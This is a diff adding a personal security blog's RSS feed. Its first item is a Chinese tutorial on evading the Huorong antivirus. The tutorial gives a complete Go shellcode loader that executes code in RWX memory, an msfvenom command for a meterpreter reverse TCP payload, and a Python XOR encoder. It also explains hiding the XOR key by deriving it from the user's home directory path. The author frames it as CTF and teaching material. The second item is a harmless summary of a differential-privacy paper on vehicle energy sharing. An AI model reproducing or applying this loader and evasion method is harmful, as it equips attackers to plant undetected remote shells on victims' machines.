@@ -1,0 +1,481 @@
+<?xml version="1.0" encoding="utf-8" standalone="yes"?>
+<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
+    <channel>
+        <title>Boris&#39;s Blog</title>
+        <link>https://id-none.github.io/</link>
+        <description>Recent content on Boris&#39;s Blog</description>
+        <generator>Hugo -- gohugo.io</generator>
+        <language>en-us</language>
+        <lastBuildDate>Mon, 03 Jun 2024 16:22:34 +0800</lastBuildDate><atom:link href="https://id-none.github.io/index.xml" rel="self" type="application/rss+xml" /><item>
+        <title>Go语言ShellCode免杀火绒</title>
+        <link>https://id-none.github.io/2024/go%E8%AF%AD%E8%A8%80shellcode%E5%85%8D%E6%9D%80%E7%81%AB%E7%BB%92/</link>
+        <pubDate>Mon, 03 Jun 2024 16:22:34 +0800</pubDate>
+        
+        <guid>https://id-none.github.io/2024/go%E8%AF%AD%E8%A8%80shellcode%E5%85%8D%E6%9D%80%E7%81%AB%E7%BB%92/</guid>
+        <description>&lt;img src="https://id-none.github.io/2024/go%E8%AF%AD%E8%A8%80shellcode%E5%85%8D%E6%9D%80%E7%81%AB%E7%BB%92/image-20240603162742164.png" alt="Featured image of post Go语言ShellCode免杀火绒" /&gt;&lt;h1 id=&#34;1--shellcode-加载器go&#34;&gt;1.  Shellcode 加载器（go）&lt;/h1&gt;
+&lt;p&gt;我们先看最后的免杀代码&lt;/p&gt;
+&lt;pre&gt;&lt;code class=&#34;language-go&#34;&gt;package main
+
+import (
+	&amp;quot;fmt&amp;quot;
+	&amp;quot;os&amp;quot;
+	&amp;quot;syscall&amp;quot;
+	&amp;quot;unsafe&amp;quot;
+)
+
+const (
+	MEM_COMMIT             = 0x1000
+	MEM_RESERVE            = 0x2000
+	PAGE_EXECUTE_READWRITE = 0x40
+)
+
+var (
+	kernel32      = syscall.NewLazyDLL(&amp;quot;kernel32.dll&amp;quot;)
+	ntdll         = syscall.NewLazyDLL(&amp;quot;ntdll.dll&amp;quot;)
+	VirtualAlloc  = kernel32.NewProc(&amp;quot;VirtualAlloc&amp;quot;)
+	RtlCopyMemory = ntdll.NewProc(&amp;quot;RtlCopyMemory&amp;quot;)
+	//shellcode_buf = []byte{
+	//}
+	shellcode_buf = []byte{
+	}
+)
+
+func check(e error) {
+	if e != nil {
+		if e.Error() != &amp;quot;The operation completed successfully.&amp;quot; { // 内存错误
+			fmt.Println(e.Error())
+			os.Exit(1)
+		}
+	}
+}
+
+func main() {
+	//// xor
+	homeDir, _ := os.UserHomeDir()
+	xor := homeDir[3] // U -&amp;gt; 85
+	decimalValue := int(xor)
+	shellcode := xorEncrypt(shellcode_buf, decimalValue)
+	//shellcode := shellcode_buf
+
+	fmt.Println(shellcode)
+	// 申请内存
+	// MEM_COMMIT|MEM_RESERVE
+	addr, _, err := VirtualAlloc.Call(0, uintptr(len(shellcode)), MEM_COMMIT, PAGE_EXECUTE_READWRITE)
+	if addr == 0 {
+		check(err)
+	}
+	// 写入shellcode
+	_, _, err = RtlCopyMemory.Call(addr, (uintptr)(unsafe.Pointer(&amp;amp;shellcode[0])), uintptr(len(shellcode)))
+	check(err)
+
+	// 执行shellcode
+	syscall.Syscall(addr, 0, 0, 0, 0)
+}
+
+func xorEncrypt(buf []byte, value int) []byte {
+	for i := 0; i &amp;lt; len(buf); i++ {
+		buf[i] ^= byte(value)
+	}
+	return buf
+}
+
+// go build -ldflags=&amp;quot;-H windowsgui -w -s&amp;quot; shellcodeLoader.go
+
+&lt;/code&gt;&lt;/pre&gt;
+&lt;h1 id=&#34;2-shellcode-生成&#34;&gt;2. shellcode 生成&lt;/h1&gt;
+&lt;p&gt;对于shellcode的生成我们采用msf进行生成：&lt;/p&gt;
+&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=xxxx LPORT=xxxx -f c
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;对于生成的shellcode，我们如果不进行处理，对于火绒这类的杀毒软件来说，做简单的静态分析，如果坚持到0xfc, 0x48, 0x83, 0xe4, 0xf0, 0xe8, 0xcc, 0x00, 0x00, 0x00, 0x41, 0x51, 0x41, 0x50···这些关键字节，肯定会报毒：Backdoor/W64.Meterpreter.f&lt;/p&gt;
+&lt;p&gt;&lt;figure 
+	
+		class=&#34;gallery-image&#34; 
+		style=&#34;
+			flex-grow: 314; 
+			flex-basis: 754px&#34;
+	&gt;
+	&lt;a href=&#34;https://id-none.github.io/2024/go%E8%AF%AD%E8%A8%80shellcode%E5%85%8D%E6%9D%80%E7%81%AB%E7%BB%92/image-20240603163500472.png&#34; data-size=&#34;761x242&#34;&gt;
+		&lt;img src=&#34;https://id-none.github.io/2024/go%E8%AF%AD%E8%A8%80shellcode%E5%85%8D%E6%9D%80%E7%81%AB%E7%BB%92/image-20240603163500472.png&#34;
+			width=&#34;761&#34;
+			height=&#34;242&#34;
+			srcset=&#34;https://id-none.github.io/2024/go%E8%AF%AD%E8%A8%80shellcode%E5%85%8D%E6%9D%80%E7%81%AB%E7%BB%92/image-20240603163500472_hu9cfd642fd07fce8fd66523927f7b4328_51356_480x0_resize_box_3.png 480w, https://id-none.github.io/2024/go%E8%AF%AD%E8%A8%80shellcode%E5%85%8D%E6%9D%80%E7%81%AB%E7%BB%92/image-20240603163500472_hu9cfd642fd07fce8fd66523927f7b4328_51356_1024x0_resize_box_3.png 1024w&#34;
+			loading=&#34;lazy&#34;
+			&gt;
+	&lt;/a&gt;
+	
+&lt;/figure&gt;&lt;/p&gt;
+&lt;h1 id=&#34;3可能的绕过方式&#34;&gt;3.可能的绕过方式&lt;/h1&gt;
+&lt;p&gt;一般来说，为了防止shellcode被检测到，我们通过对shellcode进行处理，如base64加密，亦或等等操作，也可以考虑github的sgn工具。&lt;/p&gt;
+&lt;p&gt;本文我们主要采用亦或操作（xor）&lt;/p&gt;
+&lt;p&gt;我们先将msf生成的shellcode进行亦或操作：&lt;/p&gt;
+&lt;pre&gt;&lt;code class=&#34;language-python&#34;&gt;# xor.py 
+shellcode = []
+
+# xor 85
+shellcode1 = &#39;&#39;.join([&#39;\\x%02x&#39; % i for i in shellcode])
+print(shellcode1)
+for i in range(len(shellcode)):
+    shellcode[i] ^= 85
+
+# 0x格式化输出
+shellcode = &#39;&#39;.join([&#39;\\x%02x&#39; % i for i in shellcode])
+print(shellcode)
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;&lt;figure 
+	
+		class=&#34;gallery-image&#34; 
+		style=&#34;
+			flex-grow: 615; 
+			flex-basis: 1478px&#34;
+	&gt;
+	&lt;a href=&#34;https://id-none.github.io/2024/go%E8%AF%AD%E8%A8%80shellcode%E5%85%8D%E6%9D%80%E7%81%AB%E7%BB%92/image-20240603164348537.png&#34; data-size=&#34;2476x402&#34;&gt;
+		&lt;img src=&#34;https://id-none.github.io/2024/go%E8%AF%AD%E8%A8%80shellcode%E5%85%8D%E6%9D%80%E7%81%AB%E7%BB%92/image-20240603164348537.png&#34;
+			width=&#34;2476&#34;
+			height=&#34;402&#34;
+			srcset=&#34;https://id-none.github.io/2024/go%E8%AF%AD%E8%A8%80shellcode%E5%85%8D%E6%9D%80%E7%81%AB%E7%BB%92/image-20240603164348537_hu68bb3f7e214e39998f19f09f7eab598b_73178_480x0_resize_box_3.png 480w, https://id-none.github.io/2024/go%E8%AF%AD%E8%A8%80shellcode%E5%85%8D%E6%9D%80%E7%81%AB%E7%BB%92/image-20240603164348537_hu68bb3f7e214e39998f19f09f7eab598b_73178_1024x0_resize_box_3.png 1024w&#34;
+			loading=&#34;lazy&#34;
+			&gt;
+	&lt;/a&gt;
+	
+&lt;/figure&gt;&lt;/p&gt;
+&lt;p&gt;再将shellcode进行替换，并且与目标值进行亦或，就可以获得正确的shellcode。&lt;/p&gt;
+&lt;p&gt;但是当我们进行编译的时候，任然报毒。&lt;/p&gt;
+&lt;p&gt;&lt;figure 
+	
+		class=&#34;gallery-image&#34; 
+		style=&#34;
+			flex-grow: 314; 
+			flex-basis: 754px&#34;
+	&gt;
+	&lt;a href=&#34;https://id-none.github.io/2024/go%E8%AF%AD%E8%A8%80shellcode%E5%85%8D%E6%9D%80%E7%81%AB%E7%BB%92/image-20240603163500472.png&#34; data-size=&#34;761x242&#34;&gt;
+		&lt;img src=&#34;https://id-none.github.io/2024/go%E8%AF%AD%E8%A8%80shellcode%E5%85%8D%E6%9D%80%E7%81%AB%E7%BB%92/image-20240603163500472.png&#34;
+			width=&#34;761&#34;
+			height=&#34;242&#34;
+			srcset=&#34;https://id-none.github.io/2024/go%E8%AF%AD%E8%A8%80shellcode%E5%85%8D%E6%9D%80%E7%81%AB%E7%BB%92/image-20240603163500472_hu9cfd642fd07fce8fd66523927f7b4328_51356_480x0_resize_box_3.png 480w, https://id-none.github.io/2024/go%E8%AF%AD%E8%A8%80shellcode%E5%85%8D%E6%9D%80%E7%81%AB%E7%BB%92/image-20240603163500472_hu9cfd642fd07fce8fd66523927f7b4328_51356_1024x0_resize_box_3.png 1024w&#34;
+			loading=&#34;lazy&#34;
+			&gt;
+	&lt;/a&gt;
+	
+&lt;/figure&gt;&lt;/p&gt;
+&lt;pre&gt;&lt;code class=&#34;language-go&#34;&gt;
+shellcode := xorEncrypt(shellcode_buf, 85)
+
+func xorEncrypt(buf []byte, value int) []byte {
+	for i := 0; i &amp;lt; len(buf); i++ {
+		buf[i] ^= byte(value)
+	}
+	return buf
+}
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;这是由于火绒在检测的时候如果能明确看到85，会尝试亦或来还原shellcode，base64同理。&lt;/p&gt;
+&lt;p&gt;所以我们就尝试如果隐藏85，通过读取用户目录来获取。&lt;/p&gt;
+&lt;pre&gt;&lt;code class=&#34;language-go&#34;&gt;
+	homeDir, _ := os.UserHomeDir()
+	xor := homeDir[3] // U -&amp;gt; 85
+	decimalValue := int(xor)
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;此时，shellcode是没有问题的，但是在进行编译的时候会遇到内存的报毒：&lt;/p&gt;
+&lt;p&gt;&lt;figure 
+	
+		class=&#34;gallery-image&#34; 
+		style=&#34;
+			flex-grow: 309; 
+			flex-basis: 741px&#34;
+	&gt;
+	&lt;a href=&#34;https://id-none.github.io/2024/go%E8%AF%AD%E8%A8%80shellcode%E5%85%8D%E6%9D%80%E7%81%AB%E7%BB%92/image-20240603165148696.png&#34; data-size=&#34;776x251&#34;&gt;
+		&lt;img src=&#34;https://id-none.github.io/2024/go%E8%AF%AD%E8%A8%80shellcode%E5%85%8D%E6%9D%80%E7%81%AB%E7%BB%92/image-20240603165148696.png&#34;
+			width=&#34;776&#34;
+			height=&#34;251&#34;
+			srcset=&#34;https://id-none.github.io/2024/go%E8%AF%AD%E8%A8%80shellcode%E5%85%8D%E6%9D%80%E7%81%AB%E7%BB%92/image-20240603165148696_huc6139853c71ea2ae99ec210e13bdcc2d_52278_480x0_resize_box_3.png 480w, https://id-none.github.io/2024/go%E8%AF%AD%E8%A8%80shellcode%E5%85%8D%E6%9D%80%E7%81%AB%E7%BB%92/image-20240603165148696_huc6139853c71ea2ae99ec210e13bdcc2d_52278_1024x0_resize_box_3.png 1024w&#34;
+			loading=&#34;lazy&#34;
+			&gt;
+	&lt;/a&gt;
+	
+&lt;/figure&gt;&lt;/p&gt;
+&lt;p&gt;这个原因是我们在申请内存时，设置内存权限为MEM_COMMIT|MEM_RESERVE；&lt;/p&gt;
+&lt;p&gt;&lt;figure 
+	
+		class=&#34;gallery-image&#34; 
+		style=&#34;
+			flex-grow: 254; 
+			flex-basis: 611px&#34;
+	&gt;
+	&lt;a href=&#34;https://id-none.github.io/2024/go%E8%AF%AD%E8%A8%80shellcode%E5%85%8D%E6%9D%80%E7%81%AB%E7%BB%92/image-20240603165231430.png&#34; data-size=&#34;1100x432&#34;&gt;
+		&lt;img src=&#34;https://id-none.github.io/2024/go%E8%AF%AD%E8%A8%80shellcode%E5%85%8D%E6%9D%80%E7%81%AB%E7%BB%92/image-20240603165231430.png&#34;
+			width=&#34;1100&#34;
+			height=&#34;432&#34;
+			srcset=&#34;https://id-none.github.io/2024/go%E8%AF%AD%E8%A8%80shellcode%E5%85%8D%E6%9D%80%E7%81%AB%E7%BB%92/image-20240603165231430_hu32dbec9d972f2d35da4af401bd4375f1_335259_480x0_resize_box_3.png 480w, https://id-none.github.io/2024/go%E8%AF%AD%E8%A8%80shellcode%E5%85%8D%E6%9D%80%E7%81%AB%E7%BB%92/image-20240603165231430_hu32dbec9d972f2d35da4af401bd4375f1_335259_1024x0_resize_box_3.png 1024w&#34;
+			loading=&#34;lazy&#34;
+			&gt;
+	&lt;/a&gt;
+	
+&lt;/figure&gt;&lt;/p&gt;
+&lt;p&gt;&lt;figure 
+	
+		class=&#34;gallery-image&#34; 
+		style=&#34;
+			flex-grow: 529; 
+			flex-basis: 1270px&#34;
+	&gt;
+	&lt;a href=&#34;https://id-none.github.io/2024/go%E8%AF%AD%E8%A8%80shellcode%E5%85%8D%E6%9D%80%E7%81%AB%E7%BB%92/image-20240603165236028.png&#34; data-size=&#34;1631x308&#34;&gt;
+		&lt;img src=&#34;https://id-none.github.io/2024/go%E8%AF%AD%E8%A8%80shellcode%E5%85%8D%E6%9D%80%E7%81%AB%E7%BB%92/image-20240603165236028.png&#34;
+			width=&#34;1631&#34;
+			height=&#34;308&#34;
+			srcset=&#34;https://id-none.github.io/2024/go%E8%AF%AD%E8%A8%80shellcode%E5%85%8D%E6%9D%80%E7%81%AB%E7%BB%92/image-20240603165236028_hu1c25fe5c025c7d21bb1d2be40b9d98eb_173178_480x0_resize_box_3.png 480w, https://id-none.github.io/2024/go%E8%AF%AD%E8%A8%80shellcode%E5%85%8D%E6%9D%80%E7%81%AB%E7%BB%92/image-20240603165236028_hu1c25fe5c025c7d21bb1d2be40b9d98eb_173178_1024x0_resize_box_3.png 1024w&#34;
+			loading=&#34;lazy&#34;
+			&gt;
+	&lt;/a&gt;
+	
+&lt;/figure&gt;&lt;/p&gt;
+&lt;p&gt;我们将内存权限设置为MEM_COMMIT就可以了。&lt;/p&gt;
+&lt;h1 id=&#34;4-免杀效果&#34;&gt;4. 免杀效果&lt;/h1&gt;
+&lt;p&gt;&lt;figure 
+	
+		class=&#34;gallery-image&#34; 
+		style=&#34;
+			flex-grow: 166; 
+			flex-basis: 398px&#34;
+	&gt;
+	&lt;a href=&#34;https://id-none.github.io/2024/go%E8%AF%AD%E8%A8%80shellcode%E5%85%8D%E6%9D%80%E7%81%AB%E7%BB%92/image-20240603165452345.png&#34; data-size=&#34;1023x616&#34;&gt;
+		&lt;img src=&#34;https://id-none.github.io/2024/go%E8%AF%AD%E8%A8%80shellcode%E5%85%8D%E6%9D%80%E7%81%AB%E7%BB%92/image-20240603165452345.png&#34;
+			width=&#34;1023&#34;
+			height=&#34;616&#34;
+			srcset=&#34;https://id-none.github.io/2024/go%E8%AF%AD%E8%A8%80shellcode%E5%85%8D%E6%9D%80%E7%81%AB%E7%BB%92/image-20240603165452345_hu9b6babee500537cd031d39e44c5758e6_33020_480x0_resize_box_3.png 480w, https://id-none.github.io/2024/go%E8%AF%AD%E8%A8%80shellcode%E5%85%8D%E6%9D%80%E7%81%AB%E7%BB%92/image-20240603165452345_hu9b6babee500537cd031d39e44c5758e6_33020_1024x0_resize_box_3.png 1024w&#34;
+			loading=&#34;lazy&#34;
+			&gt;
+	&lt;/a&gt;
+	
+&lt;/figure&gt;&lt;/p&gt;
+&lt;p&gt;查看能否上线&lt;/p&gt;
+&lt;p&gt;&lt;figure 
+	
+		class=&#34;gallery-image&#34; 
+		style=&#34;
+			flex-grow: 162; 
+			flex-basis: 390px&#34;
+	&gt;
+	&lt;a href=&#34;https://id-none.github.io/2024/go%E8%AF%AD%E8%A8%80shellcode%E5%85%8D%E6%9D%80%E7%81%AB%E7%BB%92/image-20240603165603224.png&#34; data-size=&#34;1299x799&#34;&gt;
+		&lt;img src=&#34;https://id-none.github.io/2024/go%E8%AF%AD%E8%A8%80shellcode%E5%85%8D%E6%9D%80%E7%81%AB%E7%BB%92/image-20240603165603224.png&#34;
+			width=&#34;1299&#34;
+			height=&#34;799&#34;
+			srcset=&#34;https://id-none.github.io/2024/go%E8%AF%AD%E8%A8%80shellcode%E5%85%8D%E6%9D%80%E7%81%AB%E7%BB%92/image-20240603165603224_hu8ffe3f08206ee9e5b4940159336c6d6c_76976_480x0_resize_box_3.png 480w, https://id-none.github.io/2024/go%E8%AF%AD%E8%A8%80shellcode%E5%85%8D%E6%9D%80%E7%81%AB%E7%BB%92/image-20240603165603224_hu8ffe3f08206ee9e5b4940159336c6d6c_76976_1024x0_resize_box_3.png 1024w&#34;
+			loading=&#34;lazy&#34;
+			&gt;
+	&lt;/a&gt;
+	
+&lt;/figure&gt;&lt;/p&gt;
+&lt;h1 id=&#34;5-总结&#34;&gt;5. 总结&lt;/h1&gt;
+&lt;p&gt;这是第一次尝试免杀，之前一直在学习pwn和web安全，但是在前段时间的上海市大学生磐石行动的比赛中，发现内网中存在杀毒软件，且无法及时绕过，虽然通过文件包含读取到了flag，但是却阻止了我们进一步的渗透利用，最后也只获得了第十一名，与决赛遗憾错过。&lt;/p&gt;
+&lt;p&gt;回来之后，反思了很多，觉得还是要对免杀进行一部分的学习，go语言的shellcode免杀通过微信推文看到的，决定挺有意思的，便在之后的学习中进行尝试，没想到就成功绕过了火绒（其他杀毒软件还没有尝试过），但是这也激起了我学习的热情。&lt;/p&gt;
+&lt;p&gt;此外，最近也收到了实验室导师的任务，给本科生同学们准备渗透测试（CTF）的课程，也觉得免杀蛮重要的，顺便也一起给讲了。&lt;/p&gt;
+&lt;p&gt;&lt;strong&gt;学无止境，脚踏实地。&lt;/strong&gt;&lt;/p&gt;
+</description>
+        </item>
+        <item>
+        <title>Vehicle-to-Vehicle Energy Sharing Scheme: A Privacy-Preserving Solution based on Local Differential Privacy Method</title>
+        <link>https://id-none.github.io/2024/vehicle-to-vehicle-energy-sharing-scheme-a-privacy-preserving-solution-based-on-local-differential-privacy-method/</link>
+        <pubDate>Fri, 17 May 2024 14:27:25 +0800</pubDate>
+        
+        <guid>https://id-none.github.io/2024/vehicle-to-vehicle-energy-sharing-scheme-a-privacy-preserving-solution-based-on-local-differential-privacy-method/</guid>
+        <description>&lt;img src="https://id-none.github.io/2024/vehicle-to-vehicle-energy-sharing-scheme-a-privacy-preserving-solution-based-on-local-differential-privacy-method/image-20240517144025453.png" alt="Featured image of post Vehicle-to-Vehicle Energy Sharing Scheme: A Privacy-Preserving Solution based on Local Differential Privacy Method" /&gt;&lt;h1 id=&#34;v2v电车能量交换&#34;&gt;V2V电车能量交换&lt;/h1&gt;
+&lt;p&gt;Vehicle-to-Vehicle Energy Sharing Scheme: A Privacy-Preserving Solution based on Local Differential Privacy Method&lt;/p&gt;
+&lt;p&gt;贡献点：&lt;/p&gt;
+&lt;ol&gt;
+&lt;li&gt;自适应隐私预算分配( Adaptive Privacy Budget Allocation，APA )模型，通过隐私预算分配来平衡数据失真和隐私泄露风险。&lt;/li&gt;
+&lt;li&gt;平衡数据隐私保护水平和数据效用的高效用扰动( HUP )模型。&lt;/li&gt;
+&lt;li&gt;改进轨迹隐私保护的隐私加权平均( PWA )模型。&lt;/li&gt;
+&lt;/ol&gt;
+&lt;p&gt;&lt;figure 
+	
+		class=&#34;gallery-image&#34; 
+		style=&#34;
+			flex-grow: 101; 
+			flex-basis: 242px&#34;
+	&gt;
+	&lt;a href=&#34;https://id-none.github.io/2024/vehicle-to-vehicle-energy-sharing-scheme-a-privacy-preserving-solution-based-on-local-differential-privacy-method/image-20240517143556752.png&#34; data-size=&#34;671x663&#34;&gt;
+		&lt;img src=&#34;https://id-none.github.io/2024/vehicle-to-vehicle-energy-sharing-scheme-a-privacy-preserving-solution-based-on-local-differential-privacy-method/image-20240517143556752.png&#34;
+			width=&#34;671&#34;
+			height=&#34;663&#34;
+			srcset=&#34;https://id-none.github.io/2024/vehicle-to-vehicle-energy-sharing-scheme-a-privacy-preserving-solution-based-on-local-differential-privacy-method/image-20240517143556752_huc32c2ca28cc31ce75a5f5068736be9f2_85561_480x0_resize_box_3.png 480w, https://id-none.github.io/2024/vehicle-to-vehicle-energy-sharing-scheme-a-privacy-preserving-solution-based-on-local-differential-privacy-method/image-20240517143556752_huc32c2ca28cc31ce75a5f5068736be9f2_85561_1024x0_resize_box_3.png 1024w&#34;
+			loading=&#34;lazy&#34;
+			alt=&#34;Implementation of VES scheme&#34;&gt;
+	&lt;/a&gt;
+	
+	&lt;figcaption&gt;Implementation of VES scheme&lt;/figcaption&gt;
+	
+&lt;/figure&gt;&lt;/p&gt;
+&lt;h2 id=&#34;apa模型-自适应隐私计算分配模型-用来平衡噪声和信息可用性&#34;&gt;APA模型 自适应隐私计算分配模型 &lt;strong&gt;用来平衡噪声和信息可用性&lt;/strong&gt;&lt;/h2&gt;
+&lt;p&gt;原始位置经历LDP（本地差分隐私）扰动【添加噪声】。使用高斯核函数和哈曼顿距离来衡量两个位置之间的相似性（S，公式1）&lt;/p&gt;
+&lt;p&gt;&lt;figure 
+	
+		class=&#34;gallery-image&#34; 
+		style=&#34;
+			flex-grow: 158; 
+			flex-basis: 381px&#34;
+	&gt;
+	&lt;a href=&#34;https://id-none.github.io/2024/vehicle-to-vehicle-energy-sharing-scheme-a-privacy-preserving-solution-based-on-local-differential-privacy-method/image-20240517143658121.png&#34; data-size=&#34;659x415&#34;&gt;
+		&lt;img src=&#34;https://id-none.github.io/2024/vehicle-to-vehicle-energy-sharing-scheme-a-privacy-preserving-solution-based-on-local-differential-privacy-method/image-20240517143658121.png&#34;
+			width=&#34;659&#34;
+			height=&#34;415&#34;
+			srcset=&#34;https://id-none.github.io/2024/vehicle-to-vehicle-energy-sharing-scheme-a-privacy-preserving-solution-based-on-local-differential-privacy-method/image-20240517143658121_huf55a24f656097528c00147e9f04535ca_55106_480x0_resize_box_3.png 480w, https://id-none.github.io/2024/vehicle-to-vehicle-energy-sharing-scheme-a-privacy-preserving-solution-based-on-local-differential-privacy-method/image-20240517143658121_huf55a24f656097528c00147e9f04535ca_55106_1024x0_resize_box_3.png 1024w&#34;
+			loading=&#34;lazy&#34;
+			alt=&#34;APA Model&#34;&gt;
+	&lt;/a&gt;
+	
+	&lt;figcaption&gt;APA Model&lt;/figcaption&gt;
+	
+&lt;/figure&gt;&lt;/p&gt;
+&lt;p&gt;公式1：使用高斯核函数和曼哈顿距离来衡量位置的相似性，参数σ表示缩放参数，决定了相似性随着距离递减而放大的速率。S的取值范围是[0,1]。&lt;/p&gt;
+&lt;p&gt;公式2：轨迹信息泄露量(TIL) = 求和[1/(相似性×距离)]？&lt;/p&gt;
+&lt;p&gt;公式3：&lt;strong&gt;ε&lt;/strong&gt;remain表示剩余的隐私预算，εtotal表示总体隐私预算，εk表示指定位置隐私预算支出。&lt;/p&gt;
+&lt;p&gt;公式4：εmin 和 εmax分别**：**引入ε min来避免将微薄的预算分配到后续位置，ε max是最大隐私预算上限的阈值。&lt;/p&gt;
+&lt;h2 id=&#34;hup模型-平衡数据隐私保护水平和数据效用的高效用扰动&#34;&gt;HUP模型 平衡数据隐私保护水平和数据效用的高效用扰动&lt;/h2&gt;
+&lt;p&gt;使用HUP模型的主要目的是在使用LDP方法保护数据隐私的同时，尽可能地保留原始数据的有用信息。例如，当我们需要共享敏感数据时，我们可以使用位置扰动算法对一些数据点的位置进行扰动，而不是完全按照LDP方法修改数据点的值。（不是很能理解）&lt;/p&gt;
+&lt;p&gt;&lt;figure 
+	
+		class=&#34;gallery-image&#34; 
+		style=&#34;
+			flex-grow: 138; 
+			flex-basis: 331px&#34;
+	&gt;
+	&lt;a href=&#34;https://id-none.github.io/2024/vehicle-to-vehicle-energy-sharing-scheme-a-privacy-preserving-solution-based-on-local-differential-privacy-method/image-20240517143736357.png&#34; data-size=&#34;340x246&#34;&gt;
+		&lt;img src=&#34;https://id-none.github.io/2024/vehicle-to-vehicle-energy-sharing-scheme-a-privacy-preserving-solution-based-on-local-differential-privacy-method/image-20240517143736357.png&#34;
+			width=&#34;340&#34;
+			height=&#34;246&#34;
+			srcset=&#34;https://id-none.github.io/2024/vehicle-to-vehicle-energy-sharing-scheme-a-privacy-preserving-solution-based-on-local-differential-privacy-method/image-20240517143736357_hu7df779c00db8c03ead26b7d0dc1cec0f_14146_480x0_resize_box_3.png 480w, https://id-none.github.io/2024/vehicle-to-vehicle-energy-sharing-scheme-a-privacy-preserving-solution-based-on-local-differential-privacy-method/image-20240517143736357_hu7df779c00db8c03ead26b7d0dc1cec0f_14146_1024x0_resize_box_3.png 1024w&#34;
+			loading=&#34;lazy&#34;
+			alt=&#34;HUP model&#34;&gt;
+	&lt;/a&gt;
+	
+	&lt;figcaption&gt;HUP model&lt;/figcaption&gt;
+	
+&lt;/figure&gt;&lt;/p&gt;
+&lt;p&gt;因此，为了最小化参与者的轨迹隐私泄露风险和最大化统计效用，我们提出了基于阈值的位置扰动( TPP )算法来获得扰动位置。&lt;/p&gt;
+&lt;p&gt;TPP算法在保证数据效用的同时，优化了&lt;strong&gt;Hausdorff距离&lt;/strong&gt;不变性的数据处理流程。&lt;/p&gt;
+&lt;p&gt;&lt;figure 
+	
+		class=&#34;gallery-image&#34; 
+		style=&#34;
+			flex-grow: 95; 
+			flex-basis: 229px&#34;
+	&gt;
+	&lt;a href=&#34;https://id-none.github.io/2024/vehicle-to-vehicle-energy-sharing-scheme-a-privacy-preserving-solution-based-on-local-differential-privacy-method/image-20240517143805378.png&#34; data-size=&#34;669x699&#34;&gt;
+		&lt;img src=&#34;https://id-none.github.io/2024/vehicle-to-vehicle-energy-sharing-scheme-a-privacy-preserving-solution-based-on-local-differential-privacy-method/image-20240517143805378.png&#34;
+			width=&#34;669&#34;
+			height=&#34;699&#34;
+			srcset=&#34;https://id-none.github.io/2024/vehicle-to-vehicle-energy-sharing-scheme-a-privacy-preserving-solution-based-on-local-differential-privacy-method/image-20240517143805378_hu4f4e6b8203594a8ff2f28faee0c4a089_88267_480x0_resize_box_3.png 480w, https://id-none.github.io/2024/vehicle-to-vehicle-energy-sharing-scheme-a-privacy-preserving-solution-based-on-local-differential-privacy-method/image-20240517143805378_hu4f4e6b8203594a8ff2f28faee0c4a089_88267_1024x0_resize_box_3.png 1024w&#34;
+			loading=&#34;lazy&#34;
+			alt=&#34;Algorithm 1&#34;&gt;
+	&lt;/a&gt;
+	
+	&lt;figcaption&gt;Algorithm 1&lt;/figcaption&gt;
+	
+&lt;/figure&gt;&lt;/p&gt;
+&lt;h2 id=&#34;pwa-改进轨迹隐私保护的隐私加权平均-防止扰动位置太假了容易被辨别出来&#34;&gt;PWA 改进轨迹隐私保护的隐私加权平均 （防止扰动位置太假了，容易被辨别出来）&lt;/h2&gt;
+&lt;p&gt;&lt;figure 
+	
+		class=&#34;gallery-image&#34; 
+		style=&#34;
+			flex-grow: 133; 
+			flex-basis: 319px&#34;
+	&gt;
+	&lt;a href=&#34;https://id-none.github.io/2024/vehicle-to-vehicle-energy-sharing-scheme-a-privacy-preserving-solution-based-on-local-differential-privacy-method/image-20240517143844201.png&#34; data-size=&#34;321x241&#34;&gt;
+		&lt;img src=&#34;https://id-none.github.io/2024/vehicle-to-vehicle-energy-sharing-scheme-a-privacy-preserving-solution-based-on-local-differential-privacy-method/image-20240517143844201.png&#34;
+			width=&#34;321&#34;
+			height=&#34;241&#34;
+			srcset=&#34;https://id-none.github.io/2024/vehicle-to-vehicle-energy-sharing-scheme-a-privacy-preserving-solution-based-on-local-differential-privacy-method/image-20240517143844201_hu7d0dfb80d13e99858385716e62393df1_18705_480x0_resize_box_3.png 480w, https://id-none.github.io/2024/vehicle-to-vehicle-energy-sharing-scheme-a-privacy-preserving-solution-based-on-local-differential-privacy-method/image-20240517143844201_hu7d0dfb80d13e99858385716e62393df1_18705_1024x0_resize_box_3.png 1024w&#34;
+			loading=&#34;lazy&#34;
+			alt=&#34;PWA Model&#34;&gt;
+	&lt;/a&gt;
+	
+	&lt;figcaption&gt;PWA Model&lt;/figcaption&gt;
+	
+&lt;/figure&gt;&lt;/p&gt;
+&lt;h1 id=&#34;问题&#34;&gt;问题：&lt;/h1&gt;
+&lt;ol&gt;
+&lt;li&gt;该文章使用了差分隐私的扰乱机制的具体技术？文章中并没有提到说使用什么扰动机制。只提到了LDP，local 差分隐私。&lt;/li&gt;
+&lt;li&gt;该方案中APA模型中的第三步，第四步的具体含义？
+&lt;ol&gt;
+&lt;li&gt;答：APA隐私预算自适应分配模型，隐私预算较大时，噪声较高，保护水平高，但是信息可用性会收到影响；当隐私预算较小时，噪声较低，保护水平低，但是信息的可用性较高。 对于剩余隐私预算&lt;/li&gt;
+&lt;li&gt;答：对于公式3来说，As evident from Fig. 3, formulas 3 and 4, the initial step involves the computation of the remaining privacy budget, denoted as εremain, for positions within the window [iω + 1, i].文章中说到这个公式求和的时候，位置[iw+1,i]区间剩余的隐私度量。&lt;/li&gt;
+&lt;li&gt;懂了，使用TIL&lt;em&gt;remain，表示之前的隐私泄露量&lt;/em&gt;隐私预算，达到考虑之前所以的差分隐私位置的影响。&lt;/li&gt;
+&lt;/ol&gt;
+&lt;/li&gt;
+&lt;/ol&gt;
+&lt;p&gt;&lt;figure 
+	
+		class=&#34;gallery-image&#34; 
+		style=&#34;
+			flex-grow: 244; 
+			flex-basis: 586px&#34;
+	&gt;
+	&lt;a href=&#34;https://id-none.github.io/2024/vehicle-to-vehicle-energy-sharing-scheme-a-privacy-preserving-solution-based-on-local-differential-privacy-method/image-20240517143953811.png&#34; data-size=&#34;814x333&#34;&gt;
